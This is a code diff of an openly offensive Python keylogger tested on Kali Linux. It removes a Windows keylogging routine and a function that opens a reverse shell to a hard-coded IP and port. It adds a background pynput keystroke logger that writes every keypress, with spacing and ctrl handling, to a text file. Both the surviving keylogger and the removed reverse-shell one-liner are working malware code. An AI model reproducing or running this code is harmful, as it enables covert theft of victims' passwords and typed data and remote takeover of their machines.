@@ -2,37 +2,16 @@
 
 #importing modules 
 try:
-    import keyboard,os
     import threading
     from pynput import keyboard
-    import platform
 except:
     pass
 
 #keystroke record
 class keylogger:
 
-    #for windows
-    def keylogging_Windows(self):
-        try:
-            while True:
-                keystrokes=keyboard.read_key()
-                with open('keystrokes.txt','a+') as fh:
-                    if (keystrokes=='space') or(keystrokes=='right space') or (keystrokes=='enter')  or (keystrokes=='backspace')  or (keystrokes=='shift') or (keystrokes=='alt'):
-                        fh.write('\n' + str(keyboard.read_key()) + '\n')
-                    elif (keystrokes=='left') or (keystrokes=='right') or (keystrokes=='up') or (keystrokes=='down') or (keystrokes=='enter')or (keystrokes=='caps lock'):
-                        fh.write('\n' + str(keyboard.read_key()) + '\n')
-                    elif (keystrokes=='ctrl'):
-                        pass
-                    elif keystrokes=='x':
-                        break
-                    else:
-                        fh.write(keyboard.read_key())
-        except:
-            pass
-
-    #for linux
-    def Keylogging_Linux(self):
+    #tested on linux (Linux kali 6.5.0-kali2-amd64)
+    def Keylogging(self):
         
         def on_key_press(key):
             try:            
@@ -41,46 +20,39 @@ class keylogger:
             except:
                 with open('keystrokes.txt','a+') as fh:
                     key=str(key)
-                    #fh.write('\n' + key + '\n')
-                    fh.write(f'\n{key}\n')
+
+                    #if spacebar is pressed just add a white space
+                    if key == 'Key.space':
+                        fh.write(' ')
+
+                    #if shift is pressed just pass the condition
+                    elif key == 'Key.shift': 
+                        pass
+                    
+                    #if ctrl is pressed,will get logged in as 'ctrl + {key}'
+                    elif key == 'Key.ctrl': 
+                        fh.write(f'\nctrl + ')
+                    
+                    else:
+                        fh.write(f'\n{key}\n')
 
         # Create listener objects
         with keyboard.Listener(on_press=on_key_press) as listener:
             listener.join()
 
 
-#netcat reverse shell connector
-def payload():
-    #just change the ip and open a terminal and execute "rlwrap nc 9090" to get a reverse shell 
-    poison="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.69.251",9090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""
-    os.system(poison)
-
-
 
 if __name__=='__main__':
-
     #creating an object
     obj=keylogger()
 
-    #calling keylogger based on OS
-    if(platform.system()=='Linux' or platform.system()=='Darwin'):
-        #implementing threading
-        t1 = threading.Thread(target=obj.Keylogging_Linux)
-        t2 = threading.Thread(target=payload)
-        
-
-    else:
-        #implementing threading
-        t1 = threading.Thread(target=obj.keylogging_Windows)
-        t2 = threading.Thread(target=payload)
-        
+    #implementing threading and daemon = True (to run it in background)
+    t1 = threading.Thread(target=obj.Keylogging,daemon = True)
     
     # start the threads
     t1.start()
-    t2.start()
-   
     
     # join the main thread
     t1.join()
-    t2.join()
+    
 
